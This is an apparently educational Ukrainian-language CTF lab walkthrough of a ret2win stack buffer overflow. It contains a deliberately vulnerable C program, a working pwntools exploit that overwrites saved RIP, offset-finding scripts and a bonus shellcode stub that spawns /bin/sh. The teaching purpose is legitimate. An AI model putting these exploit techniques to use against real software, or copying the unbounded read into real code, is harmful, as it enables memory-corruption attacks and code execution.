# Stage 06: ret2win - Класичний Buffer Overflow

## 🎯 Мета завдання

Опанувати **справжній buffer overflow** - найкласичнішу вразливість у бінарних програмах. Це перше завдання де ви перезаписуєте saved RIP **реально через переповнення буфера**, а не через спеціальний код.

## 📚 Що ви дізнаєтесь

- Що таке справжній buffer overflow (BOF)
- Як небезпечна функція `read()` без перевірки розміру
- Механізм перезапису saved RIP через переповнення
- Чому відсутність захистів робить експлуатацію тривіальною
- Різниця між навчальними прикладами та реальним BOF
- Як `return` використовує перезаписаний RIP

## 🔧 Необхідні інструменти

```bash
# Python та pwntools
pip3 install pwntools

# checksec для перевірки захистів
sudo apt install checksec

# GDB для debugging (опціонально)
sudo apt install gdb gdb-peda
```

## 📖 Теоретична основа

### Що таке Buffer Overflow?

**Buffer Overflow (переповнення буфера)** - запис даних поза межами виділеної пам'яті буфера.

```c
char buf[64];           // Виділено 64 байти
read(0, buf, 256);      // ❌ Читаємо до 256 байт!
                        // Записуємо поза межами buf
```

### Анатомія атаки

```
НОРМАЛЬНА СИТУАЦІЯ (64 байти вводу):
┌─────────────────┐
│   Saved RIP     │  0x7fff...88  ← Не чіпаємо
├─────────────────┤
│   Saved RBP     │  0x7fff...80  ← Не чіпаємо
├─────────────────┤
│   buf[63]       │  'A'
│   ...           │  ...
│   buf[0]        │  'A'
└─────────────────┘

BUFFER OVERFLOW (80+ байтів):
┌─────────────────┐
│   Saved RIP     │  0x00401136   ← ПЕРЕЗАПИСАЛИ на win()!
├─────────────────┤
│   Saved RBP     │  'AAAAAAAA'   ← Перезаписали (не важливо)
├─────────────────┤
│   buf[63]       │  'A'
│   ...           │  ...
│   buf[0]        │  'A'
└─────────────────┘

Коли функція робить return:
1. pop    rbp              ; Відновлює RBP (тепер 'AAAAAAAA')
2. ret                     ; Бере адресу зі стеку (0x00401136)
3. jmp    [той адрес]      ; Стрибає на win()!
```

### Чому це працює?

**Механізм return:**

```asm
; Епілог функції
mov    rsp, rbp          ; Відновлюємо stack pointer
pop    rbp               ; Витягуємо збережений RBP зі стеку
ret                      ; ret = pop rip; jmp rip

; ret детальніше:
; 1. rip = [rsp]         Читає 8 байт зі стеку
; 2. rsp += 8            Зміщує stack pointer
; 3. jmp rip             Стрибає на адресу з rip
```

Якщо ми перезаписали saved RIP на `0x401136` (адреса win):
```
ret → rip = 0x401136 → jmp 0x401136 → виконується win()!
```

## 💻 Аналіз коду сервера

```c
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

// Функція-ціль
__attribute__((noreturn)) void win(void){
    puts("FLAG{STAGE6_RET2WIN}");
    fflush(stdout);
    _exit(0);
}

// Вразлива функція
void vuln(void){
    char name[64];                    // Буфер на 64 байти
    puts("stage06: send your name");
    ssize_t n = read(0, name, 256);   // ❌ ВРАЗЛИВІСТЬ! Читаємо до 256
    dprintf(1, "hi %.*s\n", (int)(n>0?n:0), name);
}

int main(void){
    setbuf(stdout, NULL);             // Вимикаємо буферизацію
    vuln();                           // Викликаємо вразливу функцію
    return 0;                         // ← Сюди ми не повернемося!
}
```

### Покрокова логіка

**Крок 1:** `main()` викликає `vuln()`

```asm
call   vuln
; 1. push [адреса наступної інструкції]  ← saved RIP
; 2. jmp vuln
```

**Крок 2:** `vuln()` створює стековий фрейм

```asm
push   rbp                ; Зберігаємо старий RBP
mov    rbp, rsp           ; Новий базовий покажчик
sub    rsp, 0x50          ; Виділяємо місце для локальних змінних
```

Стек зараз:
```
┌─────────────────┐  ← Старші адреси
│ saved RIP       │  (адреса в main після call vuln)
├─────────────────┤
│ saved RBP       │  (старе значення RBP)
├─────────────────┤  ← RBP (поточний)
│ name[63]        │
│ ...             │
│ name[0]         │
└─────────────────┘  ← RSP (поточний)
```

**Крок 3:** `read(0, name, 256)` читає дані

Якщо ми відправимо 80+ байт:
- Перші 64 байти → `name[0..63]`
- Наступні 8 байт → **перезаписують saved RBP**
- Наступні 8 байт → **перезаписують saved RIP**

**Крок 4:** `vuln()` завершується через `return`

```asm
leave              ; mov rsp, rbp; pop rbp
ret                ; pop rip; jmp rip
```

`ret` читає **перезаписаний saved RIP** зі стеку і стрибає туди!

## 🚀 Покрокове рішення

### Крок 1: Збудуйте бінарник

```bash
cd stage06_ret2win
./build.sh
```

Вивід:
```
[*] Building stage06_ret2win...
[+] Built: ../build/stage06_ret2win
[+] Protections:
    - Canary: OFF
    - NX: OFF (execstack enabled)
    - PIE: OFF
    - RELRO: OFF
[+] Classic ret2win challenge - overflow to win() function
```

### Крок 2: Перевірте захисти

```bash
checksec --file=../build/stage06_ret2win
```

Очікуваний вивід:
```
RELRO           STACK CANARY      NX            PIE
No RELRO        No canary found   NX disabled   No PIE (0x400000)
```

**Пояснення:**
- ❌ **No RELRO** - GOT можна перезаписати (не потрібно зараз)
- ❌ **No canary** - немає захисту від BOF
- ❌ **NX disabled** - стек виконуваний (не потрібно зараз, ми не використовуємо shellcode)
- ❌ **No PIE** - адреси фіксовані, легко знайти win()

Всі захисти **вимкнені** = ідеальні умови для навчання!

### Крок 3: Знайдіть адресу win()

```bash
objdump -d ../build/stage06_ret2win | grep '<win>'
```

Або через pwntools:
```python
from pwn import *
elf = ELF('../build/stage06_ret2win')
print(hex(elf.symbols['win']))
```

### Крок 4: Створіть exploit

Файл `exploit.py`:

```python
#!/usr/bin/env python3
from pwn import *

# Налаштування
context.arch = 'amd64'
context.log_level = 'info'

# Завантажуємо бінарник
elf = ELF('../build/stage06_ret2win', checksec=False)

# Отримуємо адресу win()
win_addr = elf.symbols['win']
log.info(f"Адреса win(): {hex(win_addr)}")

# Запускаємо процес
io = process('../build/stage06_ret2win')

# Читаємо банер
io.recvuntil(b'send your name\n')
log.info("Отримали підказку")

# Offset до saved RIP (наданий у statement)
OFFSET = 72

# Будуємо payload
padding = b'A' * OFFSET
ret_addr = p64(win_addr)
payload = padding + ret_addr

log.info(f"Payload: {OFFSET} байт padding + адреса win()")
log.info(f"Довжина payload: {len(payload)} байт")

# Відправляємо exploit
io.sendline(payload)

# Отримуємо відповідь
response = io.recvline()
log.info(f"Відповідь: {response.decode().strip()}")

# Отримуємо прапор
flag = io.recvline()
log.success(f"Прапор: {flag.decode().strip()}")

io.close()
```

### Крок 5: Запустіть exploit

```bash
chmod +x exploit.py
python3 exploit.py
```

### Крок 6: Отримайте прапор

Очікуваний вивід:
```
[*] '/path/to/build/stage06_ret2win'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
[*] Адреса win(): 0x401136
[+] Starting local process
[*] Отримали підказку
[*] Payload: 72 байт padding + адреса win()
[*] Довжина payload: 80 байт
[*] Відповідь: hi AAAAAAA...
[+] Прапор: FLAG{STAGE6_RET2WIN}
```

## 🔍 Детальний розбір

## 🎬 Покадрова анімація Buffer Overflow

Давайте детально розглянемо ЩО САМЕ відбувається на кожному кроці:

### Кадр 0: Програма починається

```c
int main(void) {
    vuln();    // Викликаємо вразливу функцію
    return 0;  // ← Сюди ми НЕ повернемося!
}
```

**Стек перед викликом vuln():**
```
┌─────────────────┐ Вища адреса
│   ...           │
└─────────────────┘
```

### Кадр 1: main() викликає vuln()

```asm
; main():
call   vuln
  1. push [адреса наступної інструкції]  ; Зберегти адресу повернення
  2. jmp vuln                             ; Стрибнути на vuln
```

**Стек ПІСЛЯ call:**
```
┌─────────────────┐ Вища адреса
│ 0x00401234      │ ← saved RIP (адреса в main після call)
├─────────────────┤ ← RSP (stack pointer)
│   ...           │
└─────────────────┘
```

### Кадр 2: vuln() створює стековий фрейм

```asm
; vuln() пролог:
push   rbp              ; Зберегти старий RBP
mov    rbp, rsp         ; Новий базовий покажчик
sub    rsp, 0x50        ; Виділити місце (80 байт)
```

**Стек ПІСЛЯ прологу:**
```
        Адреса          Значення        Що це
┌───────────────────────────────────────────────┐
│ 0x7ffe...88 │ 0x00401234      │ saved RIP (повернення в main)
├───────────────────────────────────────────────┤
│ 0x7ffe...80 │ 0x7ffe...b0     │ saved RBP (старе значення RBP)
├───────────────────────────────────────────────┤ ← RBP (поточний base pointer)
│ 0x7ffe...40 │ ????????        │ ┐
│     ...     │ ????????        │ │ name[64]
│ 0x7ffe...01 │ ????????        │ │ (неініціалізовано)
│ 0x7ffe...00 │ ????????        │ ┘
└───────────────────────────────────────────────┘ ← RSP (вершина стеку)
```

### Кадр 3: read() виконується - ЧИТАННЯ ДАНИХ

```c
char name[64];
read(0, name, 256);  // ❌ Читає ДО 256 в буфер на 64!
```

**МИ ВІДПРАВЛЯЄМО:**
```python
payload = b'A' * 72 + p64(0x401136)
# 72 байти 'A' + 8 байт адреси win()
# Загалом: 80 байт
```

### Кадр 4: Стек ПІСЛЯ read() - ПЕРЕПОВНЕННЯ!

```
        Адреса          Що БУЛО         Що СТАЛО
┌─────────────────────────────────────────────────────────┐
│ 0x7ffe...88 │ 0x00401234      │ 0x00401136  │ ← ПЕРЕЗАПИСАНО на win()!
├─────────────────────────────────────────────────────────┤
│ 0x7ffe...80 │ 0x7ffe...b0     │ 0x4141...   │ ← ПЕРЕЗАПИСАНО на 'AAAAAAAA'
├─────────────────────────────────────────────────────────┤
│ 0x7ffe...40 │ ????????        │ 'A' 'A'     │ ┐
│     ...     │ ????????        │ 'A' 'A'     │ │
│     ...     │ ????????        │ 'A' 'A'     │ │ name[64]
│ 0x7ffe...01 │ ????????        │ 'A' 'A'     │ │ заповнено 'A'
│ 0x7ffe...00 │ ????????        │ 'A' 'A'     │ ┘
└─────────────────────────────────────────────────────────┘
```

**ЩО СТАЛОСЯ:**
- Байти 0-63: Заповнили `name[64]` символами 'A'
- Байти 64-71: ПЕРЕЗАПИСАЛИ saved RBP на 'AAAAAAAA' (0x4141414141414141)
- Байти 72-79: ПЕРЕЗАПИСАЛИ saved RIP на 0x00401136 (адреса win)

### Кадр 5: vuln() завершується - ЕПІЛОГ

```c
}  // Кінець функції vuln()
```

**Асемблер епілогу:**
```asm
; vuln() епілог:
leave:
  mov    rsp, rbp       ; Відновити stack pointer
  pop    rbp            ; Витягти saved RBP зі стеку

ret:
  pop    rip            ; Витягти saved RIP зі стеку
  jmp    rip            ; Стрибнути на адресу в RIP
```

**Покроково:**

**Крок 5.1: leave (mov rsp, rbp)**
```
RSP стає рівним RBP
RSP = 0x7ffe...80
```

**Крок 5.2: leave (pop rbp)**
```asm
pop rbp  ; RBP = [RSP]; RSP += 8
```
```
RBP тепер = 0x4141414141414141  ← Зламано, але не важливо!
RSP = 0x7ffe...88 (зсунувся на 8)
```

**Крок 5.3: ret (pop rip)**
```asm
pop rip  ; RIP = [RSP]; RSP += 8
```
```
RIP тепер = 0x00401136  ← АДРЕСА WIN()!
RSP = 0x7ffe...90
```

**Крок 5.4: ret (jmp rip)**
```asm
jmp 0x00401136  ; Стрибаємо на win()!
```

### Кадр 6: win() виконується - УСПІХ!

```c
void win(void){
    puts("FLAG{STAGE6_RET2WIN}");  ← Виконується!
    fflush(stdout);
    _exit(0);                       ← Вихід з програми
}
```

**Прапор виведено!** 🎉

## ❓ Питання-Відповіді про Buffer Overflow

### Q1: Чому RBP = 'AAAAAAAA' не проблема?

**Відповідь:** Бо `win()` робить `_exit(0)` - це **примусовий вихід** з програми БЕЗ повернення.

```c
// Якби win() мала return:
void win_bad(void){
    puts("FLAG");
    return;  // ❌ Спроба повернутися
}

// Епілог win_bad():
leave    ; pop rbp → RBP з win стеку (OK)
ret      ; pop rip → Адреса зі стеку
         ; Але тут СМІТТЯ бо ми прийшли неправильно!
         ; → CRASH!
```

**Наша win() правильна:**
```c
void win(void){
    puts("FLAG");
    _exit(0);  // ✅ Завершує ВЕСЬ процес
               // Не повертається!
}
```

### Q2: Що станеться якщо offset неправильний?

**Якщо offset МЕНШЕ 72:**
```python
payload = b'A' * 50 + p64(win_addr)
```

**Результат:**
```
┌─────────────────┐
│ 0x00401234      │ ← saved RIP НЕ ПЕРЕЗАПИСАНО
├─────────────────┤
│ 0x7ffe...       │ ← saved RBP частково перезаписано
├─────────────────┤
│ 'A' 'A' ...     │ ← 50 байт 'A'
│ 0x00401136      │ ← win адреса ВСЕРЕДИНІ буфера
│ (8 байт)        │
└─────────────────┘
```

Програма **повернеться в main()** як зазвичай. Адреса win() залишиться в буфері невикористаною.

**Якщо offset БІЛЬШЕ 72:**
```python
payload = b'A' * 80 + p64(win_addr)
```

**Результат:**
```
┌─────────────────┐
│ 0x41414141...   │ ← saved RIP = 'AAAAAAAA' (не адреса!)
├─────────────────┤
│ 'A' 'A' 'A' ...  │ ← 80 байт 'A'
├─────────────────┤
│ 0x00401136      │ ← win адреса ПІСЛЯ saved RIP
└─────────────────┘
```

Програма спробує стрибнути на `0x4141414141414141` → **SIGSEGV (краш)**

### Q3: Чому gets() такий небезпечний?

```c
char buf[64];
gets(buf);  // ❌ ДУЖЕ НЕБЕЗПЕЧНО!
```

**Проблема:** `gets()` **НЕ ЗНАЄ** розміру буфера!

**Що робить gets():**
```c
char* gets(char* buf) {
    int c;
    int i = 0;

    while ((c = getchar()) != '\n' && c != EOF) {
        buf[i++] = c;  // ❌ Записує СКІЛЬКИ ЗАВГОДНО!
                       // Навіть якщо i > розмір buf
    }

    buf[i] = '\0';
    return buf;
}
```

Якщо ввести 1000 символів в `buf[64]` → переповнення гарантовано!

**Безпечні альтернативи:**
```c
// ✅ ПРАВИЛЬНО: обмежує розмір
fgets(buf, sizeof(buf), stdin);  // Максимум 64 байти

// ✅ ПРАВИЛЬНО: обмежує розмір
read(0, buf, sizeof(buf));       // Максимум 64 байти

// ✅ ПРАВИЛЬНО: контролює розмір
scanf("%63s", buf);              // Максимум 63 + '\0'
```

### Q4: Чи можна переповнити стек "у зворотному напрямку"?

**Відповідь:** Ні! Стек росте від високих адрес до низьких, але **запис** йде від низьких до високих.

```
        Вищі адреси
┌─────────────────┐
│   Saved RIP     │ 0x7ffe...88
├─────────────────┤
│   Saved RBP     │ 0x7ffe...80
├─────────────────┤
│   buf[63]       │ 0x7ffe...7f  ← Записується ОСТАННІМ
│   buf[1]        │ 0x7ffe...41
│   buf[0]        │ 0x7ffe...40  ← Записується ПЕРШИМ
└─────────────────┘
        Нижчі адреси

read(0, buf, 256)  // Пише від buf[0] → buf[1] → ... → далі за межі!
```

Тому переповнення **завжди йде вгору** (до saved RIP).

### Q5: Що таке NOP sled і навіщо він?

**NOP sled** використовується коли ми НЕ ЗНАЄМО точної адреси:

```python
# Якщо адреса shellcode невідома точно:
nop_sled = b'\x90' * 100  # NOP інструкції (no operation)
shellcode = b'\x48\x31\xc0...'  # Реальний код

payload = nop_sled + shellcode + padding + p64(приблизна_адреса)
```

**Як працює:**
- CPU потрапляє десь в NOP sled
- Виконує NOP, NOP, NOP... (нічого не робить)
- "Сковзає" до shellcode
- Виконує shellcode

**У нашому випадку НЕ ПОТРІБЕН** бо:
- Адреса win() точно відома (PIE OFF)
- Не використовуємо shellcode

### Візуалізація процесу

**До переповнення:**
```
STACK (vuln()):
        ┌─────────────────┐  0x7fff...88
        │ 0x004011XX      │  ← saved RIP (повернення в main)
        ├─────────────────┤  0x7fff...80
        │ 0x7fff...       │  ← saved RBP
        ├─────────────────┤  0x7fff...40 ← RBP
        │ name[63] = ?    │
        │ ...             │
        │ name[0]  = ?    │
        └─────────────────┘  ← RSP
```

**Після відправки payload:**
```
PAYLOAD: 'A'*72 + p64(0x401136)

STACK (після read):
        ┌─────────────────┐
        │ 0x00401136      │  ← saved RIP (ПЕРЕЗАПИСАНО на win!)
        ├─────────────────┤
        │ 0x4141414141... │  ← saved RBP (ПЕРЕЗАПИСАНО на 'A'*8)
        ├─────────────────┤
        │ name[63] = 'A'  │
        │ ...             │
        │ name[0]  = 'A'  │
        └─────────────────┘
```

**Після return:**
```
CPU: ret
  1. pop rip         → rip = 0x00401136
  2. jmp 0x00401136  → Стрибаємо на win()

win() виконується:
  puts("FLAG{STAGE6_RET2WIN}")
  _exit(0)
```

### Чому offset = 72?

```
Стековий фрейм vuln():
┌────────────────────────────┐
│ Локальні змінні            │  Компілятор виділив місце
│ включно з name[64]         │  (може бути alignment padding)
├────────────────────────────┤
│ Saved RBP (8 байт)         │  Збережений base pointer
├────────────────────────────┤
│ Saved RIP (8 байт)         │  ← Наша ціль!
└────────────────────────────┘

Offset = відстань від початку name[] до saved RIP
       = 64 (name) + 8 (saved RBP)
       = 72 байти
```

### Експеримент: Знаходження offset через краш

**Метод 1: Циклічний паттерн**

```python
#!/usr/bin/env python3
from pwn import *

# Генеруємо унікальний паттерн
pattern = cyclic(200)
print(f"Pattern: {pattern[:50]}...")

# Запускаємо і дивимося де крашне
io = process('../build/stage06_ret2win')
io.sendlineafter(b'name\n', pattern)

# Чекаємо краш
io.wait()

# Якщо є core dump
try:
    core = io.corefile
    rip = core.rip
    log.info(f"RIP at crash: {hex(rip)}")

    # Знаходимо offset
    offset = cyclic_find(rip)
    log.success(f"Offset: {offset}")
except:
    log.warning("Core dump недоступний")
```

**Метод 2: Binary search**

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'error'

def test_offset(offset, target_addr):
    """Перевіряє чи працює даний offset"""
    try:
        io = process('../build/stage06_ret2win')
        payload = b'A' * offset + p64(target_addr)
        io.sendlineafter(b'name\n', payload)
        response = io.recvall(timeout=1)
        io.close()
        return b'FLAG' in response
    except:
        return False

elf = ELF('../build/stage06_ret2win', checksec=False)
win = elf.symbols['win']

# Binary search
low, high = 50, 100
while low < high:
    mid = (low + high) // 2
    if test_offset(mid, win):
        print(f"[+] Працює з offset {mid}")
        high = mid
    else:
        low = mid + 1

print(f"[+] Мінімальний offset: {low}")
```

## 🎓 Практичні завдання

### Завдання 1: Візуалізація стеку в GDB

```bash
# Запустіть з GDB
gdb ../build/stage06_ret2win

# В GDB:
break vuln              # Точка зупинки в vuln()
run                     # Запуск
# Введіть щось короткe: AAAA

# Подивіться стек
x/20gx $rsp             # 20 qword'ів зі стеку
info frame              # Інфо про поточний фрейм

# Продовжте до return
break *vuln+XX          # Знайдіть адресу ret інструкції
continue

# Подивіться що на стеку перед ret
x/gx $rsp               # Це saved RIP!
```

### Завдання 2: Експеримент з неправильним offset

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('../build/stage06_ret2win', checksec=False)
win = elf.symbols['win']

# Спробуємо різні offset
for offset in [64, 68, 72, 76, 80]:
    print(f"\n[*] Тестуємо offset {offset}")
    io = process('../build/stage06_ret2win')

    payload = b'A' * offset + p64(win)
    io.sendlineafter(b'name\n', payload)

    try:
        output = io.recvall(timeout=1).decode()
        if 'FLAG' in output:
            print(f"[+] SUCCESS з offset {offset}")
            print(f"    {output.strip()}")
        else:
            print(f"[-] FAIL: {output.strip()[:50]}")
    except:
        print(f"[-] CRASH")

    io.close()
```

### Завдання 3: Контроль більше ніж RIP

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('../build/stage06_ret2win', checksec=False)
win = elf.symbols['win']
main = elf.symbols['main']

# Спробуємо виконати win() → main() → win()
io = process('../build/stage06_ret2win')

payload = (
    b'A' * 72 +           # Padding
    p64(win) +            # Перший return → win()
    b'B' * 8 +            # Фейковий RBP для win
    p64(main)             # Другий return → main() (не спрацює бо win робить _exit)
)

io.sendlineafter(b'name\n', payload)
print(io.recvall(timeout=1).decode())
io.close()
```

### Завдання 4: Shellcode замість win() (бонус)

Оскільки NX=OFF, можна виконати shellcode:

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

# Генеруємо shellcode для execve("/bin/sh")
shellcode = asm(shellcraft.sh())
print(f"Shellcode: {len(shellcode)} байт")

io = process('../build/stage06_ret2win')

# Кладемо shellcode в буфер, стрибаємо на нього
# Потрібна адреса буфера (складно без leak, для демонстрації)
# Простіше використати win(), але це показує можливість

io.sendlineafter(b'name\n', b'A' * 72 + p64(0xdeadbeef))  # Заглушка
io.close()

print("[!] Це завдання складніше - потрібна адреса стеку")
print("[!] У stage 07 ви навчитеся витягувати адреси")
```

## 💡 Порівняння з попередніми етапами

| Аспект | Stage 04 | Stage 05 | Stage 06 |
|--------|----------|----------|----------|
| Вразливість | Пряме читання | Симуляція BOF | **Справжній BOF** |
| Виклик цілі | `fp()` явно | `fp()` явно | `return` неявно |
| Підказки | Немає | NEED=N | **Немає** |
| Offset | Не потрібен | 72 (даний) | 72 (треба знайти) |
| Реалістичність | ⭐☆☆☆☆ | ⭐⭐☆☆☆ | **⭐⭐⭐⭐☆** |

## 🔐 Поширені вразливості BOF

### 1. Небезпечні функції

```c
// ❌ НЕБЕЗПЕЧНІ (не перевіряють розмір):
gets(buf);                    // Ніколи не використовуйте!
scanf("%s", buf);             // Теж небезпечно
strcpy(dest, src);            // Якщо src довше dest
strcat(dest, src);            // Теж може переповнити

// ⚠️ ПОТЕНЦІЙНО НЕБЕЗПЕЧНІ:
read(0, buf, 256);            // Якщо buf < 256
recv(sock, buf, 1024, 0);     // Якщо buf < 1024

// ✅ БЕЗПЕЧНІ:
fgets(buf, sizeof(buf), stdin);        // Обмежує розмір
snprintf(buf, sizeof(buf), "%s", src); // Обмежує розмір
strncpy(dest, src, sizeof(dest));      // Обмежує (але має нюанси)
```

### 2. Реальні CVE приклади

**CVE-2014-0160 (Heartbleed):**
```c
// Спрощений приклад
void heartbeat(int payload_length, char *payload) {
    char buffer[100];
    // ❌ payload_length може бути більше 100!
    memcpy(buffer, payload, payload_length);
    send(buffer, payload_length);  // Відправляє пам'ять поза буфером
}
```

**CVE-2020-1350 (SIGRed - Windows DNS):**
Переповнення буфера через неправильну обробку DNS записів.

### 3. Захисти у реальному світі

Сучасні програми мають захисти:

```
Типова програма 2024:
✅ Canary         - детектує BOF
✅ NX             - блокує shellcode
✅ PIE + ASLR     - рандомізує адреси
✅ Full RELRO     - захищає GOT
✅ FORTIFY_SOURCE - перевіряє розміри на етапі компіляції
```

Наше завдання:
```
Stage 06 (навчальне):
❌ No Canary      - BOF можливий
❌ NX disabled    - можна shellcode (не потрібно)
❌ No PIE         - адреси фіксовані
❌ No RELRO       - GOT вразливий (не потрібно)
```

## 📚 Наступні кроки

### Що далі?

**Stage 07 - Leak demo:**
- Ввімкнемо **NX**
- Додамо механізм **витоку адрес**
- Навчимося обходити **ASLR**

**Stage 08 - ret2libc:**
- Повноцінний **ROP chain**
- Виклик `system("/bin/sh")`
- Техніка **ORW** (Open-Read-Write)

### Додаткове читання

- [Smashing The Stack For Fun And Profit](http://phrack.org/issues/49/14.html) - класична стаття 1996 року
- [Modern Binary Exploitation](https://github.com/RPISEC/MBE) - курс RPI
- [pwn.college](https://pwn.college/) - інтерактивне навчання
- [ROP Emporium](https://ropemporium.com/) - практика ROP

## 🐛 Debugging підказки

### Програма крашить замість win()?

**Перевірте offset:**
```bash
python3 -c "from pwn import *; print(cyclic(100))" | ../build/stage06_ret2win
dmesg | tail  # Подивіться адресу краша
```

**Перевірте адресу win():**
```bash
objdump -d ../build/stage06_ret2win | grep '<win>'
nm ../build/stage06_ret2win | grep win
```

**Перевірте payload:**
```python
payload = b'A' * 72 + p64(win_addr)
print(f"Length: {len(payload)}")      # Має бути 80
print(f"Last 8 bytes: {payload[-8:].hex()}")  # Має бути адреса win
```

### Немає виводу прапора?

**Перевірте буферизацію:**
```c
setbuf(stdout, NULL);  // Має бути в коді
```

**Додайте в exploit:**
```python
io.sendline(payload)
time.sleep(0.5)        # Дайте час на обробку
print(io.recvall(timeout=2).decode())
```

## ✅ Чеклист виконання

- [ ] Зібрано бінарник через `build.sh`
- [ ] Перевірено що всі захисти вимкнені (checksec)
- [ ] Знайдено адресу win() через objdump або pwntools
- [ ] Зрозумів механізм справжнього BOF
- [ ] Створив робочий exploit з offset=72
- [ ] Отримав прапор FLAG{STAGE6_RET2WIN}
- [ ] Експериментував з різними offset
- [ ] Зрозумів як return використовує saved RIP
- [ ] Знаю небезпечні функції (gets, strcpy, etc)
- [ ] Готовий до Stage 07 (leak + ASLR)!

---

**Час виконання:** 20-30 хвилин
**Складність:** ⭐⭐⭐☆☆ (Середня)
**Категорія:** PWN / Buffer Overflow
**Ключові поняття:** BOF, saved RIP, return hijacking, ret2win
**CVE аналоги:** CVE-2014-0160, CVE-2020-1350 та тисячі інших

## 🎉 Вітаємо!

Ви щойно експлуатували **справжній buffer overflow**! Це фундаментальна техніка в binary exploitation. Всі складніші атаки (ROP, ret2libc) базуються на цій концепції.

**Наступний виклик:** У Stage 07 і 08 додадуться захисти (NX, ASLR), і доведеться використовувати просунутіші техніки!
